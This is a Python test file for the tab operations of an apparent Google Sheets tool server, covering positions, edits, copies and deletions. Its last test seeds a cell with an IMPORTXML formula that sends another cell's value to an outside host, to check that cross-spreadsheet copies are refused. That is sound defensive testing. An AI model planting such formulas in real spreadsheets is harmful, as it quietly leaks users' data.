import pytest
from sheets_mcp import tabs
from sheets_mcp.errors import SheetsError


def tab_titles(fake, book):
    return [tab['properties']['title'] for tab in fake.files[book]['tabs']]


def test_describe_counts_positions_from_one(fake, clients):
    """Verify describe_spreadsheet numbers tab positions from 1 in tab
    order and reports each grid size.

    Mutation: passing the API's 0-based index through as position.
    Oracle: two seeded tabs, so positions 1 and 2.
    """
    book = fake.add_spreadsheet('Book', {'Data': [['a']], 'Notes': []})
    described = tabs.describe_spreadsheet(clients, book)
    assert described['title'] == 'Book'
    assert [(tab['title'], tab['position'], tab['rows']) for tab in described['tabs']] == [
        ('Data', 1, 1000), ('Notes', 2, 1000)]


def test_add_tab_at_position(fake, clients):
    """Verify position 1 adds the tab first.

    Mutation: sending position unchanged as the 0-based index, which puts
    the tab second.
    Oracle: tab order after the call.
    """
    book = fake.add_spreadsheet('Book', {'Data': []})
    assert tabs.add_tab(clients, book, 'Intro', position=1) == {
        'title': 'Intro', 'position': 1}
    assert tab_titles(fake, book) == ['Intro', 'Data']


def test_edit_tab_changes_only_given_properties(fake, clients):
    """Verify edit_tab's field mask names only the options given, so a
    hidden tab stays hidden through a rename and a freeze.

    Mutation: a mask that always includes 'hidden', which resets it to
    visible.
    Oracle: the fake honors the field mask as the API does.
    """
    book = fake.add_spreadsheet('Book', {'Data': [], 'Other': []})
    tabs.edit_tab(clients, book, 'Data', hidden=True)
    answer = tabs.edit_tab(clients, book, 'Data', title='Raw', frozen_rows=1)
    assert answer == {'title': 'Raw', 'changed': ['title', 'frozen_rows']}
    properties = fake.files[book]['tabs'][0]['properties']
    assert properties['title'] == 'Raw'
    assert properties['hidden'] is True
    assert properties['gridProperties']['frozenRowCount'] == 1


def test_edit_tab_empty_color_clears(fake, clients):
    """Verify color '' sends the color field with no value, which clears it.

    Mutation: treating '' like None and sending nothing.
    Oracle: the recorded request's mask and properties.
    """
    book = fake.add_spreadsheet('Book', {'Data': []})
    tabs.edit_tab(clients, book, 'Data', color='#1A73E8')
    tabs.edit_tab(clients, book, 'Data', color='')
    cleared = fake.requests[-1]['updateSheetProperties']
    assert cleared['fields'] == 'tabColorStyle'
    assert 'tabColorStyle' not in cleared['properties']


def test_edit_tab_needs_a_change(fake, clients):
    """Verify edit_tab with no option is refused before calling Google.

    Mutation: sending an update with an empty field mask.
    Oracle: no request is recorded.
    """
    book = fake.add_spreadsheet('Book', {'Data': []})
    with pytest.raises(SheetsError):
        tabs.edit_tab(clients, book, 'Data')
    assert fake.requests == []


def test_copy_tab_in_place_and_across(fake, clients):
    """Verify copy_tab duplicates in place under a new title, and copies
    into another spreadsheet and renames the copy there.

    Mutation: renaming the copy in the source spreadsheet, or ignoring
    title on the in-place copy.
    Oracle: titles and cells of both spreadsheets after the calls.
    """
    book = fake.add_spreadsheet('Book', {'Template': [['x', 1]]})
    other = fake.add_spreadsheet('Other', {'Sheet1': []})
    assert tabs.copy_tab(clients, book, 'Template', title='March') == {
        'spreadsheet_id': book, 'title': 'March'}
    assert tabs.copy_tab(clients, book, 'Template', other, title='April') == {
        'spreadsheet_id': other, 'title': 'April'}
    assert tab_titles(fake, book) == ['Template', 'March']
    assert tab_titles(fake, other) == ['Sheet1', 'April']
    assert fake.cells(other, 'April') == [['x', 1]]


def test_delete_tab_and_unknown_tab_message(fake, clients):
    """Verify delete_tab removes the tab, and an unknown title is refused
    with the real titles listed.

    Mutation: tab_properties matching titles without case, or the error
    leaving out the tab list the caller needs to retry.
    Oracle: the seeded titles.
    """
    book = fake.add_spreadsheet('Book', {'Data': [], 'Scratch': []})
    tabs.delete_tab(clients, book, 'Scratch')
    assert tab_titles(fake, book) == ['Data']
    with pytest.raises(SheetsError, match=r"no tab 'data'; the tabs are \['Data'\]"):
        tabs.delete_tab(clients, book, 'data')


def test_edit_tab_moves_right_to_the_position_asked(fake, clients):
    """Verify position 2 moves the first tab to second place.

    Mutation: sending position - 1 when moving right, which the API reads
    before the move and leaves the tab first.
    Oracle: the fake counts the index before the move, as the API does.
    """
    book = fake.add_spreadsheet('Book', {'Data': [], 'S2': [], 'S3': []})
    tabs.edit_tab(clients, book, 'Data', position=2)
    assert tab_titles(fake, book) == ['S2', 'Data', 'S3']


def test_copy_tab_across_refuses_url_formula(fake, clients):
    """Verify a tab with a URL-fetching formula is not copied into another
    spreadsheet, and nothing lands there.

    Mutation: skipping the formula scan on a cross-spreadsheet copy.
    Oracle: the destination's tab list after the refusal.
    """
    source = fake.add_spreadsheet(
        'Source', {'T': [['=IMPORTXML("https://example.com/?"&A1, "//a")']]})
    target = fake.add_spreadsheet('Target', {'Sheet1': []})
    with pytest.raises(SheetsError, match='IMPORTXML'):
        tabs.copy_tab(clients, source, 'T', target)
    assert tab_titles(fake, target) == ['Sheet1']
